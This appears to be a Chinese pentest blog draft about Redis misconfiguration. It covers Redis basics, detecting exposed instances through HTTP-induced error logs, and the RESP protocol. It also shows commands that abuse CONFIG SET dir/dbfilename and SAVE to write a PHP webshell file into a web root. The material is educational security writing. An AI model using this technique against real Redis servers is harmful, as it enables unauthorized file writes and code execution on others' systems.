---
title: 'Redis的配置问题(非关系型数据库的安全问题)'
date: 2019-01-01
category: '渗透测试'
tags: []
lang: 'zh'
draft: true
---
# Redis是什么

> REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。

Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。

它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。

# Redis的基本介绍

## 配置相关
Redis 的配置文件位于 Redis 安装目录下，文件名为 redis.conf(Windows 名为 redis.windows.conf)。

redis安装完成以后有自己的命令行，也就是`redis-cli`，其中包含的命令可以在：http://redis.io/commands 进行查阅。各个客户端基本也就是依照这个命令去增删改查

## 与mongodb的区别

redis的角色更接近于memcache，而mongodb是一个真正的数据库。

redis是一个`key-value`型数据库，信息以键对应值的关系存储在内存中，比memcache较大的优势就在于其数据结构的多样性。

> 因为redis是主要把数据存储在内存中（当然可以把其存储至硬盘上，这也是写shell的必要条件之一），其“缓存”的性质远大于其“数据存储”的性质，其中数据的正删改查也只是像变量操作一样简单。

# 利用Redis写shell

> 我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件：

如下：

```
config set dir /home/wwwroot/default
config set dbfilename redis.php
set webshell "<? php phpinfo(); ?>"
save

```

> 们可以通过config set来更改dir和dbfilename。也就是说我们可以不用修改redis.conf，也不用重启redis服务就可以写入任意文件：

# 发现redis

比如看到了如下日志
> -ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'

说明我们提交的http请求被redis执行了，但是参数不对所以命令执行失败

# 与redis进行交互

```php
ECHO HELLO
//返回的数据
$5
HELLO

TIME
*2
$10
1410273409
$6
380112

CONFIG GET pidfile
*2
$7
pidfile
$18
/var/run/redis.pid

SET my_key my_value
+OK

GET my_key
$8
my_value

QUIT
+OK
```

你会看到redis返回给你的数据很奇特
这是由它的规则决定的

如果我们要传递下面一条命令

> redis-cli -h 127.0.0.1 -p 6379 set with_space 'I am boring'+OK

`with_space`是 `'I am boring'`的key

我们需要这样子。
`$ echo -e  '*3\r\n$3\r\nSET\r\n$10\r\nwith_space\r\n$11\r\nI am boring\r\n' | nc -n -q 1 127.0.0.1 6379 +OK`

了解之前提到的规则你就明白了

> --每一行都要使用分隔符(CRLF)
--一条命令用”\*”开始，同时用数字作为参数，需要分隔符(“\*1”+ CRLF)
--我们有多个参数时：
-字符：以”\$”开头+字符的长度（＂\$4＂+CRLF）+字符串(“TIME”+CRLF)
-整数：以”:”开头+整数的ASCII码(“:42”+CRLF)

# 参考

[利用redis写shell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)
[Trying to hack Redis via HTTP requests](https://www.secpulse.com/archives/5366.html)
